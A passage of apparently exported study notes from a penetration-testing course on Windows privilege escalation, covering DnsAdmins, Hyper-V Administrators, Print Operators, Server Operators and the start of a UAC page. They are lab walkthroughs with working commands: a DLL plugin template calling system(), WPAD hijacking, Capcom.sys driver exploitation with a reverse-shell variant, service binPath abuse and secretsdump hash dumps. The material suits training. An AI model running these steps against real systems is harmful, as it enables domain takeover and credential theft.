IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 6960\n        FLAGS              :\n```\n\n#### Confirming Group Membership\n\nIf all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> net group \"Domain Admins\" /dom\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            netadm\nThe command completed successfully.\n```\n\n---\n\n## Cleaning Up\n\nMaking configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.\n\nThese steps must be taken from an elevated console with a local or domain admin account.\n\n#### Confirming Registry Key Added\n\nThe first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\n    GlobalQueryBlockList    REG_MULTI_SZ    wpad\\0isatap\n    EnableGlobalQueryBlockList    REG_DWORD    0x1\n    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL\n    Forwarders    REG_MULTI_SZ    1.1.1.1\\08.8.8.8\n    ForwardingTimeout    REG_DWORD    0x3\n    IsSlave    REG_DWORD    0x0\n    BootMethod    REG_DWORD    0x3\n    AdminConfigured    REG_DWORD    0x1\n    ServerLevelPluginDll    REG_SZ    adduser.dll\n```\n\n#### Deleting Registry Key\n\nWe can use the `reg delete` command to remove the key that points to our custom DLL.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters  /v ServerLevelPluginDll\n\nDelete the registry value ServerLevelPluginDll (Yes/No)? Y\nThe operation completed successfully.\n```\n\n#### Starting the DNS Service Again\n\nOnce this is done, we can start up the DNS service again.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> sc.exe start dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 4984\n        FLAGS              :\n```\n\n#### Checking DNS Service Status\n\nIf everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an `nslookup` against the localhost or another host in the domain.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> sc query dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n```\n\nOnce again, this is a potentially destructive attack that we should only carry out with explicit permission from and in coordination with our client. If they understand the risks and want to see a full proof of concept, then the steps outlined in this section will help demonstrate the attack and clean up afterward.\n\n---\n\n## Using Mimilib.dll\n\nAs detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.\n\nCode: c\n\n```c\n/*\tBenjamin DELPY `gentilkiwi`\n\thttps://blog.gentilkiwi.com\n\tbenjamin@gentilkiwi.com\n\tLicence : https://creativecommons.org/licenses/by/4.0/\n*/\n#include \"kdns.h\"\n\nDWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)\n{\n\treturn ERROR_SUCCESS;\n}\n\nDWORD WINAPI kdns_DnsPluginCleanup()\n{\n\treturn ERROR_SUCCESS;\n}\n\nDWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)\n{\n\tFILE * kdns_logfile;\n#pragma warning(push)\n#pragma warning(disable:4996)\n\tif(kdns_logfile = _wfopen(L\"kiwidns.log\", L\"a\"))\n#pragma warning(pop)\n\t{\n\t\tklog(kdns_logfile, L\"%S (%hu)\\n\", pszQueryName, wQueryType);\n\t\tfclose(kdns_logfile);\n\t    system(\"ENTER COMMAND HERE\");\n\t}\n\treturn ERROR_SUCCESS;\n}\n```\n\n---\n\n## Creating a WPAD Record\n\nAnother way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.\n\nAfter disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.\n\n#### Disabling the Global Query Block List\n\nTo set up this attack, we first disabled the global query block list:\n\nDnsAdmins\n\n```powershell-session\nC:\\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local\n```\n\n#### Adding a WPAD Record\n\nNext, we add a WPAD record pointing to our attack machine.\n\nDnsAdmins\n\n```powershell-session\nC:\\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/14-Hyper-V Administrators",
    "path": "02_CPTS/17-Windows Privilege Escalation/14-Hyper-V Administrators.md",
    "title": "14 Hyper V Administrators",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Hyper-V Administrators --- The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Do...",
    "category": "02_CPTS",
    "content": "# Hyper-V Administrators\n\n---\n\nThe [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.\n\nIt is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, `vmms.exe` attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\\SYSTEM`, without impersonating the user. We can delete the `.vhdx` file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.\n\nIf the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.\n\n#### Target File\n\nAn example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:\n\nHyper-V Administrators\n\n```shell-session\nC:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\n```\n\n#### Taking Ownership of the File\n\nAfter running the PowerShell script, we should have full control of this file and can take ownership of it.\n\nHyper-V Administrators\n\n```cmd-session\nC:\\htb> takeown /F C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\n```\n\n#### Starting the Mozilla Maintenance Service\n\nNext, we can replace this file with a malicious `maintenanceservice.exe`, start the maintenance service, and get command execution as SYSTEM.\n\nHyper-V Administrators\n\n```cmd-session\nC:\\htb> sc.exe start MozillaMaintenance\n```\n\nNote: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/15-Print Operators",
    "path": "02_CPTS/17-Windows Privilege Escalation/15-Print Operators.md",
    "title": "15 Print Operators",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Print Operators --- Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain C...",
    "category": "02_CPTS",
    "content": "# Print Operators\n\n---\n\n[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.\n\n#### Confirming Privileges\n\nPrint Operators\n\n```cmd-session\nC:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name           Description                          State\n======================== =================================    =======\nSeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled\nSeChangeNotifyPrivilege  Bypass traverse checking             Enabled\nSeShutdownPrivilege      Shut down the system                 Disabled\n```\n\n#### Checking Privileges Again\n\nThe [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.\n\nPrint Operators\n\n```cmd-session\nC:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================  ==========\nSeMachineAccountPrivilege     Add workstations to domain           Disabled\nSeLoadDriverPrivilege         Load and unload device drivers       Disabled\nSeShutdownPrivilege           Shut down the system\t\t\t       Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\n```\n\nIt's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.\n\nDownload it locally and edit it, pasting over the includes below.\n\nCode: c\n\n```c\n#include <windows.h>\n#include <assert.h>\n#include <winternl.h>\n#include <sddl.h>\n#include <stdio.h>\n#include \"tchar.h\"\n```\n\nNext, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.\n\n#### Compile with cl.exe\n\nPrint Operators\n\n```cmd-session\nC:\\Users\\mrb3n\\Desktop\\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp\n\nMicrosoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\nEnableSeLoadDriverPrivilege.cpp\nMicrosoft (R) Incremental Linker Version 14.28.29913.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n/out:EnableSeLoadDriverPrivilege.exe\nEnableSeLoadDriverPrivilege.obj\n```\n\n#### Add Reference to Driver\n\nNext, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.\n\nPrint Operators\n\n```cmd-session\nC:\\htb> reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\n\nThe operation completed successfully.\n\n\nC:\\htb> reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n\nThe operation completed successfully.\n```\n\nThe odd syntax `\\??\\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.\n\n#### Verify Driver is not Loaded\n\nUsing Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.\n\nPrint Operators\n\n```powershell-session\nPS C:\\htb> .\\DriverView.exe /stext drivers.txt\nPS C:\\htb> cat drivers.txt | Select-String -pattern Capcom\n```\n\n#### Verify Privilege is Enabled\n\nRun the `EnableSeLoadDriverPrivilege.exe` binary.\n\nPrint Operators\n\n```cmd-session\nC:\\htb> EnableSeLoadDriverPrivilege.exe\n\nwhoami:\nINLANEFREIGHT0\\printsvc\n\nwhoami /priv\nSeMachineAccountPrivilege        Disabled\nSeLoadDriverPrivilege            Enabled\nSeShutdownPrivilege              Disabled\nSeChangeNotifyPrivilege          Enabled by default\nSeIncreaseWorkingSetPrivilege    Disabled\nNTSTATUS: 00000000, WinError: 0\n```\n\n#### Verify Capcom Driver is Listed\n\nNext, verify that the Capcom driver is now listed.\n\nPrint Operators\n\n```powershell-session\nPS C:\\htb> .\\DriverView.exe /stext drivers.txt\nPS C:\\htb> cat drivers.txt | Select-String -pattern Capcom\n\nDriver Name           : Capcom.sys\nFilename              : C:\\Tools\\Capcom.sys\n```\n\n#### Use ExploitCapcom Tool to Escalate Privileges\n\nTo exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.\n\nPrint Operators\n\n```powershell-session\nPS C:\\htb> .\\ExploitCapcom.exe\n\n[*] Capcom.sys exploit\n[*] Capcom.sys handle was obained as 0000000000000070\n[*] Shellcode was placed at 0000024822A50008\n[+] Shellcode was executed\n[+] Token stealing was successful\n[+] The SYSTEM shell was launched\n```\n\nThis launches a shell with SYSTEM privileges.\n\n![Command prompt running as NT AUTHORITY\\SYSTEM. PowerShell shows Capcom.sys driver identified and ExploitCapcom.exe executed, resulting in successful token stealing and SYSTEM shell launch.](https://academy.hackthebox.com/storage/modules/67/capcomexploit.png)\n\n---\n\n## Alternate Exploitation - No GUI\n\nIf we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `\"C:\\\\Windows\\\\system32\\\\cmd.exe\"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\\ProgramData\\revshell.exe`.\n\nCode: c\n\n```c\n// Launches a command shell process\nstatic bool LaunchShell()\n{\n    TCHAR CommandLine[] = TEXT(\"C:\\\\Windows\\\\system32\\\\cmd.exe\");\n    PROCESS_INFORMATION ProcessInfo;\n    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };\n    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,\n        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,\n        &ProcessInfo))\n    {\n        return false;\n    }\n\n    CloseHandle(ProcessInfo.hThread);\n    CloseHandle(ProcessInfo.hProcess);\n    return true;\n}\n```\n\nThe `CommandLine` string in this example would be changed to:\n\nCode: c\n\n```c\n TCHAR CommandLine[] = TEXT(\"C:\\\\ProgramData\\\\revshell.exe\");\n```\n\nWe would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.\n\n---\n\n## Automating the Steps\n\n#### Automating with EopLoadDriver\n\nWe can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:\n\nPrint Operators\n\n```cmd-session\nC:\\htb> EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys\n\n[+] Enabling SeLoadDriverPrivilege\n[+] SeLoadDriverPrivilege Enabled\n[+] Loading Driver: \\Registry\\User\\S-1-5-21-454284637-3659702366-2958135535-1103\\System\\CurrentControlSet\\Capcom\nNTSTATUS: c000010e, WinError: 0\n```\n\nWe would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.\n\n---\n\n## Clean-up\n\n#### Removing Registry Key\n\nWe can cover our tracks a bit by deleting the registry key added earlier.\n\nPrint Operators\n\n```cmd-session\nC:\\htb> reg delete HKCU\\System\\CurrentControlSet\\Capcom\n\nPermanently delete the registry key HKEY_CURRENT_USER\\System\\CurrentControlSet\\Capcom (Yes/No)? Yes\n\nThe operation completed successfully.\n```\n\nNote: Since Windows 10 Version 1803, the \"SeLoadDriverPrivilege\" is not exploitable, as it is no longer possible to include references to registry keys under \"HKEY_CURRENT_USER\".",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/16-Server Operators",
    "path": "02_CPTS/17-Windows Privilege Escalation/16-Server Operators.md",
    "title": "16 Server Operators",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Server Operators --- The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in...",
    "category": "02_CPTS",
    "content": "# Server Operators\n\n---\n\nThe [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.\n\nMembership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.\n\n#### Querying the AppReadiness Service\n\nLet's examine the `AppReadiness` service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility.\n\nServer Operators\n\n```cmd-session\nC:\\htb> sc qc AppReadiness\n\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: AppReadiness\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\System32\\svchost.exe -k AppReadiness -p\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : App Readiness\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n```\n\n#### Checking Service Permissions with PsService\n\nWe can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.\n\nServer Operators\n\n```cmd-session\nC:\\htb> c:\\Tools\\PsService.exe security AppReadiness\n\nPsService v2.25 - Service information and configuration utility\nCopyright (C) 2001-2010 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nSERVICE_NAME: AppReadiness\nDISPLAY_NAME: App Readiness\n        ACCOUNT: LocalSystem\n        SECURITY:\n        [ALLOW] NT AUTHORITY\\SYSTEM\n                Query status\n                Query Config\n                Interrogate\n                Enumerate Dependents\n                Pause/Resume\n                Start\n                Stop\n                User-Defined Control\n                Read Permissions\n        [ALLOW] BUILTIN\\Administrators\n                All\n        [ALLOW] NT AUTHORITY\\INTERACTIVE\n                Query status\n                Query Config\n                Interrogate\n                Enumerate Dependents\n                User-Defined Control\n                Read Permissions\n        [ALLOW] NT AUTHORITY\\SERVICE\n                Query status\n                Query Config\n                Interrogate\n                Enumerate Dependents\n                User-Defined Control\n                Read Permissions\n        [ALLOW] BUILTIN\\Server Operators\n                All\n```\n\nThis confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.\n\n#### Checking Local Admin Group Membership\n\nLet's take a look at the current members of the local administrators group and confirm that our target account is not present.\n\nServer Operators\n\n```cmd-session\nC:\\htb> net localgroup Administrators\n\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nDomain Admins\nEnterprise Admins\nThe command completed successfully.\n```\n\n#### Modifying the Service Binary Path\n\nLet's change the binary path to execute a command which adds our current user to the default local administrators group.\n\nServer Operators\n\n```cmd-session\nC:\\htb> sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\"\n\n[SC] ChangeServiceConfig SUCCESS\n```\n\n#### Starting the Service\n\nStarting the service fails, which is expected.\n\nServer Operators\n\n```cmd-session\nC:\\htb> sc start AppReadiness\n\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n```\n\n#### Confirming Local Admin Group Membership\n\nIf we check the membership of the administrators group, we see that the command was executed successfully.\n\nServer Operators\n\n```cmd-session\nC:\\htb> net localgroup Administrators\n\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nDomain Admins\nEnterprise Admins\nserver_adm\nThe command completed successfully.\n```\n\n#### Confirming Local Admin Access on Domain Controller\n\nFrom here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.\n\nServer Operators\n\n```shell-session\ndrxh3kr@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'\n\nSMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\\server_adm:HTB_@cademy_stdnt! (Pwn3d!)\n```\n\n#### Retrieving NTLM Password Hashes from the Domain Controller\n\nServer Operators\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator\n\nImpacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43\nAdministrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a\nAdministrator:des-cbc-md5:d60dfbbf20548938\n[*] Cleaning up...\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/17-User Account Control",
    "path": "02_CPTS/17-Windows Privilege Escalation/17-User Account Control.md",
    "title": "17 User Account Control",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "User Account Control --- User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level ca...",
    "category": "02_CPTS",
    "content": "# User Account Control\n\n---\n\n[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. Applications have different `integrity` levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.\n\nWhen UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.\n\nThis [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:\n\n|Group Policy Setting|Registry Key|Default Setting|\n|---|---|---|\n|[User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)|FilterAdministratorToken|Disabled|\n|[User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)|EnableUIADesktopToggle|Disabled|\n|[User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)|ConsentPromptBehaviorAdmin|Prompt for consent for non-Windows binaries|\n|[User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)|ConsentPromptBehaviorUser|Prompt for credentials on the secure desktop|\n|[User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)|EnableInstallerDetection|Enabled (default for home) Disabled (default for enterprise)|\n|[User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)|ValidateAdminCodeSignatures|Disabled|\n|[User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)|EnableSecureUIAPaths|Enabled|\n|[User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)|EnableLUA|Enabled|\n|[User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)|PromptOnSecureDesktop|Enabled|\n|[User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)|EnableVirtualization|Enabled|\n\n[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)\n\n![User Account Control prompt asking to allow Registry Editor to make changes. Verified publisher: Microsoft Windows. Options: Yes or No.](https://academy.hackthebox.com/storage/modules/67/uac.png)\n\nUAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.\n\nThe `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account `sarah` is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.\n\n#### Checking Current User\n\nUser Account Control\n\n```cmd-session\nC:\\htb> whoami /user\n\nUSER INFORMATION\n----------------\n\nUser Name         SID\n================= ==============================================\nwinlpe-ws03\\sarah S-1-5-21-3159276091-2191180989-3781274054-1002\n```\n\n#### Confirming Admin Group Membership\n\nUser Account Control\n\n```cmd-session\nC:\\htb> net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nmrb3n\nsarah\nThe command completed successfully.\n```\n\n#### Reviewing User Privileges\n\nUser Account Control\n\n```cmd-session\nC:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n```\n\n#### Confirming 